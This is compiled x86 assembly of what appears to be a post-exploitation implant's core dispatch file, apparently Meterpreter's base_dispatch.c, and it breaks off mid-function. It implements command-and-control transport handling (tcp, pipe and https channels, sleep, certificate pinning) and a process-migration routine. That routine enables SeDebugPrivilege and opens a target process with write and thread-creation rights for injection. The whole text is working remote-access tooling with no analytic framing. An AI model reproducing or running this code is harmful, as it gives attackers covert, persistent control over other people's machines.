	.file	"base_dispatch.c"
	.text
	.globl	_get_migrate_context
	.def	_get_migrate_context;	.scl	2;	.type	32;	.endef
_get_migrate_context:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$24, %esp
	movl	$16, 4(%esp)
	movl	$1, (%esp)
	call	_calloc
	movl	%eax, %edx
	movl	12(%ebp), %eax
	movl	%edx, (%eax)
	movl	12(%ebp), %eax
	movl	(%eax), %eax
	testl	%eax, %eax
	jne	L2
	movl	$14, %eax
	jmp	L3
L2:
	movl	8(%ebp), %eax
	movl	$16, (%eax)
	movl	$0, %eax
L3:
	leave
	ret
	.section .rdata,"dr"
	.align 2
LC0:
	.ascii "t\0c\0p\0\0\0"
	.align 2
LC1:
	.ascii "p\0i\0p\0e\0\0\0"
	.align 2
LC2:
	.ascii "h\0t\0t\0p\0s\0\0\0"
	.text
	.globl	_create_transport_from_request
	.def	_create_transport_from_request;	.scl	2;	.type	32;	.endef
_create_transport_from_request:
	pushl	%ebp
	movl	%esp, %ebp
	pushl	%edi
	subl	$1124, %esp
	movl	$8, -12(%ebp)
	movl	$0, -16(%ebp)
	movl	$65967, 4(%esp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_get_tlv_value_wstring
	movl	%eax, -24(%ebp)
	movl	$0, -72(%ebp)
	movl	$0, -68(%ebp)
	movl	$0, -64(%ebp)
	movl	$131506, 4(%esp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_get_tlv_value_uint
	movl	%eax, -28(%ebp)
	movl	$131505, 4(%esp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_get_tlv_value_uint
	movl	%eax, -72(%ebp)
	movl	$131511, 4(%esp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_get_tlv_value_uint
	movl	%eax, -68(%ebp)
	movl	$131512, 4(%esp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_get_tlv_value_uint
	movl	%eax, -64(%ebp)
	cmpl	$0, -28(%ebp)
	je	L5
	movl	8(%ebp), %eax
	movl	-28(%ebp), %edx
	movl	%edx, 68(%eax)
	call	_current_unix_timestamp
	movl	8(%ebp), %edx
	movl	68(%edx), %edx
	addl	%eax, %edx
	movl	8(%ebp), %eax
	movl	%edx, 72(%eax)
L5:
	movl	-72(%ebp), %eax
	testl	%eax, %eax
	jne	L6
	movl	8(%ebp), %eax
	movl	4(%eax), %eax
	movl	52(%eax), %eax
	movl	%eax, -72(%ebp)
L6:
	movl	-68(%ebp), %eax
	testl	%eax, %eax
	jne	L7
	movl	8(%ebp), %eax
	movl	4(%eax), %eax
	movl	56(%eax), %eax
	movl	%eax, -68(%ebp)
L7:
	movl	-64(%ebp), %eax
	testl	%eax, %eax
	jne	L8
	movl	8(%ebp), %eax
	movl	4(%eax), %eax
	movl	60(%eax), %eax
	movl	%eax, -64(%ebp)
L8:
	cmpl	$0, -24(%ebp)
	je	L22
	movl	$3, 8(%esp)
	movl	$LC0, 4(%esp)
	movl	-24(%ebp), %eax
	movl	%eax, (%esp)
	call	_wcsncmp
	testl	%eax, %eax
	jne	L11
	leal	-1112(%ebp), %edx
	movl	$0, %eax
	movl	$259, %ecx
	movl	%edx, %edi
	rep stosl
	movl	-72(%ebp), %eax
	movl	%eax, -88(%ebp)
	movl	-68(%ebp), %eax
	movl	%eax, -84(%ebp)
	movl	-64(%ebp), %eax
	movl	%eax, -80(%ebp)
	movl	$1024, 8(%esp)
	movl	-24(%ebp), %eax
	movl	%eax, 4(%esp)
	leal	-1112(%ebp), %eax
	movl	%eax, (%esp)
	call	_memcpy
	movl	8(%ebp), %eax
	movl	60(%eax), %eax
	movl	$0, 8(%esp)
	leal	-1112(%ebp), %edx
	movl	%edx, 4(%esp)
	movl	8(%ebp), %edx
	movl	%edx, (%esp)
	call	*%eax
	movl	%eax, -16(%ebp)
	jmp	L12
L11:
	movl	$4, 8(%esp)
	movl	$LC1, 4(%esp)
	movl	-24(%ebp), %eax
	movl	%eax, (%esp)
	call	_wcsncmp
	testl	%eax, %eax
	jne	L13
	leal	-1112(%ebp), %edx
	movl	$0, %eax
	movl	$259, %ecx
	movl	%edx, %edi
	rep stosl
	movl	-72(%ebp), %eax
	movl	%eax, -88(%ebp)
	movl	-68(%ebp), %eax
	movl	%eax, -84(%ebp)
	movl	-64(%ebp), %eax
	movl	%eax, -80(%ebp)
	movl	$1024, 8(%esp)
	movl	-24(%ebp), %eax
	movl	%eax, 4(%esp)
	leal	-1112(%ebp), %eax
	movl	%eax, (%esp)
	call	_memcpy
	movl	8(%ebp), %eax
	movl	60(%eax), %eax
	movl	$0, 8(%esp)
	leal	-1112(%ebp), %edx
	movl	%edx, 4(%esp)
	movl	8(%ebp), %edx
	movl	%edx, (%esp)
	call	*%eax
	movl	%eax, -16(%ebp)
	jmp	L12
L13:
	movl	$5, 8(%esp)
	movl	$LC2, 4(%esp)
	movl	-24(%ebp), %eax
	movl	%eax, (%esp)
	call	_wcsncmp
	testl	%eax, %eax
	sete	%al
	movzbl	%al, %eax
	movl	%eax, -32(%ebp)
	movl	$65968, 4(%esp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_get_tlv_value_wstring
	movl	%eax, -36(%ebp)
	movl	$65972, 4(%esp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_get_tlv_value_wstring
	movl	%eax, -40(%ebp)
	movl	$65973, 4(%esp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_get_tlv_value_wstring
	movl	%eax, -44(%ebp)
	movl	$65974, 4(%esp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_get_tlv_value_wstring
	movl	%eax, -48(%ebp)
	movl	$0, -76(%ebp)
	leal	-76(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	$262579, 4(%esp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_get_tlv_value_raw
	movl	%eax, -52(%ebp)
	movl	$65977, 4(%esp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_get_tlv_value_wstring
	movl	%eax, -56(%ebp)
	movl	$2082, -20(%ebp)
	cmpl	$0, -56(%ebp)
	je	L14
	movl	-56(%ebp), %eax
	movl	%eax, (%esp)
	call	_wcslen
	addl	%eax, -20(%ebp)
L14:
	movl	-20(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$1, (%esp)
	call	_calloc
	movl	%eax, -60(%ebp)
	movl	-72(%ebp), %edx
	movl	-60(%ebp), %eax
	movl	%edx, 1024(%eax)
	movl	-68(%ebp), %eax
	movl	%eax, %edx
	movl	-60(%ebp), %eax
	movl	%edx, 1028(%eax)
	movl	-64(%ebp), %eax
	movl	%eax, %edx
	movl	-60(%ebp), %eax
	movl	%edx, 1032(%eax)
	movl	-60(%ebp), %eax
	movl	$512, 8(%esp)
	movl	-24(%ebp), %edx
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	call	_wcsncpy
	cmpl	$0, -40(%ebp)
	je	L15
	movl	-60(%ebp), %eax
	leal	1036(%eax), %edx
	movl	$128, 8(%esp)
	movl	-40(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	%edx, (%esp)
	call	_wcsncpy
	movl	-40(%ebp), %eax
	movl	%eax, (%esp)
	call	_free
L15:
	cmpl	$0, -44(%ebp)
	je	L16
	movl	-60(%ebp), %eax
	leal	1292(%eax), %edx
	movl	$64, 8(%esp)
	movl	-44(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	%edx, (%esp)
	call	_wcsncpy
	movl	-44(%ebp), %eax
	movl	%eax, (%esp)
	call	_free
L16:
	cmpl	$0, -48(%ebp)
	je	L17
	movl	-60(%ebp), %eax
	leal	1420(%eax), %edx
	movl	$64, 8(%esp)
	movl	-48(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	%edx, (%esp)
	call	_wcsncpy
	movl	-48(%ebp), %eax
	movl	%eax, (%esp)
	call	_free
L17:
	cmpl	$0, -36(%ebp)
	je	L18
	movl	-60(%ebp), %eax
	leal	1548(%eax), %edx
	movl	$256, 8(%esp)
	movl	-36(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	%edx, (%esp)
	call	_wcsncpy
	movl	-36(%ebp), %eax
	movl	%eax, (%esp)
	call	_free
L18:
	cmpl	$0, -52(%ebp)
	je	L19
	movl	-60(%ebp), %eax
	leal	2060(%eax), %edx
	movl	$20, 8(%esp)
	movl	-52(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	%edx, (%esp)
	call	_memcpy
L19:
	cmpl	$0, -56(%ebp)
	je	L20
	movl	-60(%ebp), %eax
	leal	2080(%eax), %edx
	movl	-56(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	%edx, (%esp)
	call	_wcscpy
L20:
	movl	8(%ebp), %eax
	movl	60(%eax), %eax
	movl	-60(%ebp), %edx
	movl	$0, 8(%esp)
	movl	%edx, 4(%esp)
	movl	8(%ebp), %edx
	movl	%edx, (%esp)
	call	*%eax
	movl	%eax, -16(%ebp)
	movl	-60(%ebp), %eax
	movl	%eax, (%esp)
	call	_free
L12:
	movl	$0, -12(%ebp)
	jmp	L10
L22:
	nop
L10:
	movl	16(%ebp), %eax
	movl	-16(%ebp), %edx
	movl	%edx, (%eax)
	movl	-12(%ebp), %eax
	addl	$1124, %esp
	popl	%edi
	popl	%ebp
	ret
	.globl	_remote_request_core_transport_list
	.def	_remote_request_core_transport_list;	.scl	2;	.type	32;	.endef
_remote_request_core_transport_list:
	pushl	%ebp
	movl	%esp, %ebp
	pushl	%ebx
	subl	$52, %esp
	movl	$0, -12(%ebp)
	movl	$0, -20(%ebp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_create_response
	movl	%eax, -20(%ebp)
	cmpl	$0, -20(%ebp)
	jne	L24
	movl	$8, -12(%ebp)
	jmp	L25
L24:
	movl	8(%ebp), %eax
	movl	72(%eax), %ebx
	call	_current_unix_timestamp
	subl	%eax, %ebx
	movl	%ebx, %eax
	movl	%eax, 8(%esp)
	movl	$131506, 4(%esp)
	movl	-20(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_add_tlv_uint
	movl	8(%ebp), %eax
	movl	4(%eax), %eax
	movl	%eax, -16(%ebp)
	movl	8(%ebp), %eax
	movl	4(%eax), %eax
	movl	%eax, -24(%ebp)
L35:
	call	_packet_create_group
	movl	%eax, -28(%ebp)
	cmpl	$0, -28(%ebp)
	je	L38
	movl	-16(%ebp), %eax
	movl	44(%eax), %eax
	movl	%eax, 8(%esp)
	movl	$65967, 4(%esp)
	movl	-28(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_add_tlv_wstring
	movl	-16(%ebp), %eax
	movl	52(%eax), %eax
	movl	%eax, 8(%esp)
	movl	$131505, 4(%esp)
	movl	-28(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_add_tlv_uint
	movl	-16(%ebp), %eax
	movl	56(%eax), %eax
	movl	%eax, 8(%esp)
	movl	$131511, 4(%esp)
	movl	-28(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_add_tlv_uint
	movl	-16(%ebp), %eax
	movl	60(%eax), %eax
	movl	%eax, 8(%esp)
	movl	$131512, 4(%esp)
	movl	-28(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_add_tlv_uint
	movl	-16(%ebp), %eax
	movl	(%eax), %eax
	cmpl	$2, %eax
	je	L27
	cmpl	$6, %eax
	jne	L28
L27:
	movl	-16(%ebp), %eax
	movl	48(%eax), %eax
	movl	%eax, -32(%ebp)
	movl	-32(%ebp), %eax
	movl	20(%eax), %eax
	testl	%eax, %eax
	je	L29
	movl	-32(%ebp), %eax
	movl	20(%eax), %eax
	movl	%eax, 8(%esp)
	movl	$65968, 4(%esp)
	movl	-28(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_add_tlv_wstring
L29:
	movl	-32(%ebp), %eax
	movl	32(%eax), %eax
	testl	%eax, %eax
	je	L30
	movl	-32(%ebp), %eax
	movl	32(%eax), %eax
	movl	%eax, 8(%esp)
	movl	$65972, 4(%esp)
	movl	-28(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_add_tlv_wstring
L30:
	movl	-32(%ebp), %eax
	movl	36(%eax), %eax
	testl	%eax, %eax
	je	L31
	movl	-32(%ebp), %eax
	movl	36(%eax), %eax
	movl	%eax, 8(%esp)
	movl	$65973, 4(%esp)
	movl	-28(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_add_tlv_wstring
L31:
	movl	-32(%ebp), %eax
	movl	40(%eax), %eax
	testl	%eax, %eax
	je	L32
	movl	-32(%ebp), %eax
	movl	40(%eax), %eax
	movl	%eax, 8(%esp)
	movl	$65974, 4(%esp)
	movl	-28(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_add_tlv_wstring
L32:
	movl	-32(%ebp), %eax
	movl	12(%eax), %eax
	testl	%eax, %eax
	je	L33
	movl	-32(%ebp), %eax
	movl	12(%eax), %eax
	movl	$20, 12(%esp)
	movl	%eax, 8(%esp)
	movl	$262579, 4(%esp)
	movl	-28(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_add_tlv_raw
L33:
	movl	-32(%ebp), %eax
	movl	44(%eax), %eax
	testl	%eax, %eax
	je	L39
	movl	-32(%ebp), %eax
	movl	44(%eax), %eax
	movzwl	(%eax), %eax
	testw	%ax, %ax
	je	L39
	movl	-32(%ebp), %eax
	movl	44(%eax), %eax
	movl	%eax, 8(%esp)
	movl	$65977, 4(%esp)
	movl	-28(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_add_tlv_wstring
L39:
	nop
L28:
	movl	-28(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	$1073742266, 4(%esp)
	movl	-20(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_add_group
	movl	-16(%ebp), %eax
	movl	68(%eax), %eax
	movl	%eax, -16(%ebp)
	movl	-24(%ebp), %eax
	cmpl	-16(%ebp), %eax
	jne	L35
	jmp	L25
L38:
	nop
L25:
	cmpl	$0, -20(%ebp)
	je	L36
	movl	-20(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	8(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	-12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_transmit_response
L36:
	movl	-12(%ebp), %eax
	addl	$52, %esp
	popl	%ebx
	popl	%ebp
	ret
	.globl	_remote_request_core_transport_next
	.def	_remote_request_core_transport_next;	.scl	2;	.type	32;	.endef
_remote_request_core_transport_next:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$24, %esp
	movl	8(%ebp), %eax
	movl	4(%eax), %edx
	movl	8(%ebp), %eax
	movl	4(%eax), %eax
	movl	68(%eax), %eax
	cmpl	%eax, %edx
	jne	L41
	movl	16(%ebp), %eax
	movl	$1, (%eax)
	jmp	L42
L41:
	movl	8(%ebp), %eax
	movl	4(%eax), %eax
	movl	68(%eax), %edx
	movl	8(%ebp), %eax
	movl	%edx, 8(%eax)
	movl	16(%ebp), %eax
	movl	$0, (%eax)
L42:
	movl	16(%ebp), %eax
	movl	(%eax), %eax
	movl	%eax, 8(%esp)
	movl	12(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_transmit_empty_response
	movl	16(%ebp), %eax
	movl	(%eax), %eax
	testl	%eax, %eax
	setne	%al
	movzbl	%al, %eax
	leave
	ret
	.globl	_remote_request_core_transport_prev
	.def	_remote_request_core_transport_prev;	.scl	2;	.type	32;	.endef
_remote_request_core_transport_prev:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$24, %esp
	movl	8(%ebp), %eax
	movl	4(%eax), %edx
	movl	8(%ebp), %eax
	movl	4(%eax), %eax
	movl	72(%eax), %eax
	cmpl	%eax, %edx
	jne	L45
	movl	16(%ebp), %eax
	movl	$1, (%eax)
	jmp	L46
L45:
	movl	8(%ebp), %eax
	movl	4(%eax), %eax
	movl	72(%eax), %edx
	movl	8(%ebp), %eax
	movl	%edx, 8(%eax)
	movl	16(%ebp), %eax
	movl	$0, (%eax)
L46:
	movl	16(%ebp), %eax
	movl	(%eax), %eax
	movl	%eax, 8(%esp)
	movl	12(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_transmit_empty_response
	movl	16(%ebp), %eax
	movl	(%eax), %eax
	testl	%eax, %eax
	setne	%al
	movzbl	%al, %eax
	leave
	ret
	.globl	_remote_request_core_transport_remove
	.def	_remote_request_core_transport_remove;	.scl	2;	.type	32;	.endef
_remote_request_core_transport_remove:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$40, %esp
	movl	$0, -12(%ebp)
	movl	8(%ebp), %eax
	movl	4(%eax), %edx
	movl	8(%ebp), %eax
	movl	4(%eax), %eax
	movl	72(%eax), %eax
	cmpl	%eax, %edx
	jne	L49
	movl	$1, -12(%ebp)
	jmp	L50
L49:
	movl	$0, -16(%ebp)
	movl	8(%ebp), %eax
	movl	4(%eax), %eax
	movl	%eax, -20(%ebp)
	movl	$65967, 4(%esp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_get_tlv_value_wstring
	movl	%eax, -24(%ebp)
L53:
	movl	-20(%ebp), %eax
	movl	44(%eax), %eax
	movl	%eax, 4(%esp)
	movl	-24(%ebp), %eax
	movl	%eax, (%esp)
	call	_wcscmp
	testl	%eax, %eax
	jne	L51
	movl	-20(%ebp), %eax
	movl	%eax, -16(%ebp)
	jmp	L52
L51:
	movl	-20(%ebp), %eax
	movl	68(%eax), %eax
	movl	%eax, -20(%ebp)
	movl	8(%ebp), %eax
	movl	4(%eax), %eax
	cmpl	%eax, -20(%ebp)
	jne	L53
L52:
	cmpl	$0, -16(%ebp)
	je	L54
	movl	8(%ebp), %eax
	movl	4(%eax), %eax
	cmpl	%eax, -16(%ebp)
	jne	L55
L54:
	movl	$87, -12(%ebp)
	jmp	L56
L55:
	movl	8(%ebp), %eax
	movl	64(%eax), %eax
	movl	-16(%ebp), %edx
	movl	%edx, 4(%esp)
	movl	8(%ebp), %edx
	movl	%edx, (%esp)
	call	*%eax
L56:
	cmpl	$0, -24(%ebp)
	je	L50
	movl	-24(%ebp), %eax
	movl	%eax, (%esp)
	call	_free
	movl	$0, -24(%ebp)
L50:
	movl	-12(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	12(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_transmit_empty_response
	movl	-12(%ebp), %eax
	leave
	ret
	.globl	_remote_request_core_transport_add
	.def	_remote_request_core_transport_add;	.scl	2;	.type	32;	.endef
_remote_request_core_transport_add:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$40, %esp
	movl	$0, -16(%ebp)
	leal	-16(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	12(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	call	_create_transport_from_request
	movl	%eax, -12(%ebp)
	movl	-12(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	12(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_transmit_empty_response
	movl	-12(%ebp), %eax
	leave
	ret
	.globl	_remote_request_core_transport_sleep
	.def	_remote_request_core_transport_sleep;	.scl	2;	.type	32;	.endef
_remote_request_core_transport_sleep:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$40, %esp
	movl	$131505, 4(%esp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_get_tlv_value_uint
	movl	%eax, -12(%ebp)
	movl	8(%ebp), %eax
	movl	-12(%ebp), %edx
	movl	%edx, 12(%eax)
	movl	8(%ebp), %eax
	movl	4(%eax), %edx
	movl	8(%ebp), %eax
	movl	%edx, 8(%eax)
	movl	$0, 8(%esp)
	movl	12(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_transmit_empty_response
	movl	16(%ebp), %eax
	movl	$0, (%eax)
	movl	$0, %eax
	leave
	ret
	.globl	_remote_request_core_transport_change
	.def	_remote_request_core_transport_change;	.scl	2;	.type	32;	.endef
_remote_request_core_transport_change:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$40, %esp
	movl	$0, -12(%ebp)
	leal	-12(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	12(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	call	_create_transport_from_request
	movl	16(%ebp), %edx
	movl	%eax, (%edx)
	movl	16(%ebp), %eax
	movl	(%eax), %eax
	movl	%eax, 8(%esp)
	movl	12(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_transmit_empty_response
	movl	16(%ebp), %eax
	movl	(%eax), %eax
	testl	%eax, %eax
	jne	L63
	movl	-12(%ebp), %edx
	movl	8(%ebp), %eax
	movl	%edx, 8(%eax)
	movl	$0, %eax
	jmp	L65
L63:
	movl	$1, %eax
L65:
	leave
	ret
	.globl	_remote_request_core_transport_setcerthash
	.def	_remote_request_core_transport_setcerthash;	.scl	2;	.type	32;	.endef
_remote_request_core_transport_setcerthash:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$56, %esp
	movl	$0, -12(%ebp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_create_response
	movl	%eax, -16(%ebp)
	cmpl	$0, -16(%ebp)
	jne	L67
	movl	$8, -12(%ebp)
	jmp	L75
L67:
	movl	8(%ebp), %eax
	movl	4(%eax), %eax
	movl	(%eax), %eax
	cmpl	$6, %eax
	je	L69
	movl	$10, -12(%ebp)
	jmp	L75
L69:
	movl	$0, -32(%ebp)
	leal	-32(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	$262579, 4(%esp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_get_tlv_value_raw
	movl	%eax, -20(%ebp)
	movl	8(%ebp), %eax
	movl	4(%eax), %eax
	movl	48(%eax), %eax
	movl	%eax, -24(%ebp)
	movl	-24(%ebp), %eax
	movl	12(%eax), %eax
	testl	%eax, %eax
	jne	L70
	cmpl	$0, -20(%ebp)
	je	L71
	movl	$20, (%esp)
	call	_malloc
	movl	%eax, -28(%ebp)
	cmpl	$0, -28(%ebp)
	jne	L72
	movl	$8, -12(%ebp)
	jmp	L75
L72:
	movl	$20, 8(%esp)
	movl	-20(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	-28(%ebp), %eax
	movl	%eax, (%esp)
	call	_memcpy
	movl	-24(%ebp), %eax
	movl	-28(%ebp), %edx
	movl	%edx, 12(%eax)
	jmp	L73
L71:
	movl	$160, -12(%ebp)
	jmp	L75
L70:
	cmpl	$0, -20(%ebp)
	je	L74
	movl	$160, -12(%ebp)
	jmp	L75
L74:
	movl	-24(%ebp), %eax
	movl	12(%eax), %eax
	testl	%eax, %eax
	je	L73
	movl	-24(%ebp), %eax
	movl	12(%eax), %eax
	movl	%eax, (%esp)
	call	_free
	movl	-24(%ebp), %eax
	movl	$0, 12(%eax)
L73:
	movl	$0, -12(%ebp)
L75:
	cmpl	$0, -16(%ebp)
	je	L76
	movl	-16(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	8(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	-12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_transmit_response
L76:
	movl	-12(%ebp), %eax
	leave
	ret
	.globl	_remote_request_core_transport_getcerthash
	.def	_remote_request_core_transport_getcerthash;	.scl	2;	.type	32;	.endef
_remote_request_core_transport_getcerthash:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$40, %esp
	movl	$0, -12(%ebp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_create_response
	movl	%eax, -16(%ebp)
	cmpl	$0, -16(%ebp)
	jne	L79
	movl	$8, -12(%ebp)
	jmp	L80
L79:
	movl	8(%ebp), %eax
	movl	4(%eax), %eax
	movl	(%eax), %eax
	cmpl	$6, %eax
	jne	L81
	movl	8(%ebp), %eax
	movl	4(%eax), %eax
	movl	48(%eax), %eax
	movl	%eax, -20(%ebp)
	movl	-20(%ebp), %eax
	movl	12(%eax), %eax
	testl	%eax, %eax
	je	L81
	movl	-20(%ebp), %eax
	movl	12(%eax), %eax
	movl	$20, 12(%esp)
	movl	%eax, 8(%esp)
	movl	$262579, 4(%esp)
	movl	-16(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_add_tlv_raw
L81:
	movl	$0, -12(%ebp)
L80:
	cmpl	$0, -16(%ebp)
	je	L82
	movl	-16(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	8(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	-12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_transmit_response
L82:
	movl	-12(%ebp), %eax
	leave
	ret
	.section .rdata,"dr"
LC3:
	.ascii "SeDebugPrivilege\0"
	.text
	.globl	_remote_request_core_migrate
	.def	_remote_request_core_migrate;	.scl	2;	.type	32;	.endef
_remote_request_core_migrate:
	pushl	%ebp
	movl	%esp, %ebp
	pushl	%ebx
	subl	$132, %esp
	movl	$0, -12(%ebp)
	movl	$0, -24(%ebp)
	movl	$0, -52(%ebp)
	movl	$0, -16(%ebp)
	movl	$0, -20(%ebp)
	movl	$0, -28(%ebp)
	movl	$0, -32(%ebp)
	movl	$0, -36(%ebp)
	movl	$0, -40(%ebp)
	movl	$0, -56(%ebp)
	movl	$0, -60(%ebp)
	movl	$0, -64(%ebp)
	movl	$0, -68(%ebp)
	movl	$0, -44(%ebp)
	movl	$0, -48(%ebp)
	movl	$0, -72(%ebp)
	movl	$0, -76(%ebp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_create_response
	movl	%eax, -24(%ebp)
	cmpl	$0, -24(%ebp)
	jne	L85
	movl	$8, -12(%ebp)
	jmp	L101
L85:
	movl	$131474, 4(%esp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_get_tlv_value_uint
	movl	%eax, -44(%ebp)
	movl	$131477, 4(%esp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_get_tlv_value_uint
	movl	%eax, -48(%ebp)
	leal	-68(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	$262548, 4(%esp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_get_tlv_value_raw
	movl	%eax, -28(%ebp)
	movl	$0, -80(%ebp)
	leal	-80(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	$262605, 4(%esp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_get_tlv_value_raw
	movl	%eax, -40(%ebp)
	leal	-64(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	$262555, 4(%esp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_get_tlv_value_raw
	movl	%eax, -32(%ebp)
	movl	__imp__GetCurrentProcess@0, %eax
	call	*%eax
	leal	-52(%ebp), %edx
	movl	%edx, 8(%esp)
	movl	$40, 4(%esp)
	movl	%eax, (%esp)
	movl	__imp__OpenProcessToken@12, %eax
	call	*%eax
	subl	$12, %esp
	testl	%eax, %eax
	je	L87
	movl	$0, -96(%ebp)
	movl	$0, -92(%ebp)
	movl	$0, -88(%ebp)
	movl	$0, -84(%ebp)
	movl	$1, -96(%ebp)
	movl	$2, -84(%ebp)
	leal	-96(%ebp), %eax
	addl	$4, %eax
	movl	%eax, 8(%esp)
	movl	$LC3, 4(%esp)
	movl	$0, (%esp)
	movl	__imp__LookupPrivilegeValueA@12, %eax
	call	*%eax
	subl	$12, %esp
	testl	%eax, %eax
	je	L88
	movl	-52(%ebp), %eax
	movl	$0, 20(%esp)
	movl	$0, 16(%esp)
	movl	$0, 12(%esp)
	leal	-96(%ebp), %edx
	movl	%edx, 8(%esp)
	movl	$0, 4(%esp)
	movl	%eax, (%esp)
	movl	__imp__AdjustTokenPrivileges@24, %eax
	call	*%eax
	subl	$24, %esp
L88:
	movl	-52(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__CloseHandle@4, %eax
	call	*%eax
	subl	$4, %esp
L87:
	movl	-44(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	$0, 4(%esp)
	movl	$1146, (%esp)
	movl	__imp__OpenProcess@12, %eax
	call	*%eax
	subl	$12, %esp
	movl	%eax, -16(%ebp)
	cmpl	$0, -16(%ebp)
	jne	L89
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%eax, -12(%ebp)
	jmp	L101
L89:
	movl	8(%ebp), %eax
	movl	(%eax), %eax
	leal	-76(%ebp), %edx
	movl	%edx, 12(%esp)
	leal	-72(%ebp), %edx
	movl	%edx, 8(%esp)
	movl	-40(%ebp), %edx
	movl	%edx, 4(%esp)
	movl	8(%ebp), %edx
	movl	%edx, (%esp)
	call	*%eax
	movl	8(%ebp), %eax
	movl	4(%eax), %eax
	movl	40(%eax), %eax
	testl	%eax, %eax
	je	L90
	movl	8(%ebp), %eax
	movl	4(%eax), %eax
	movl	40(%eax), %eax
	movl	8(%ebp), %edx
	movl	4(%edx), %edx
	leal	-56(%ebp), %ecx
	movl	%ecx, 16(%esp)
	leal	-60(%ebp), %ecx
	movl	%ecx, 12(%esp)
	movl	-16(%ebp), %ecx
	movl	%ecx, 8(%esp)
	movl	-44(%ebp), %ecx
	movl	%ecx, 4(%esp)
	movl	%edx, (%esp)
	call	*%eax
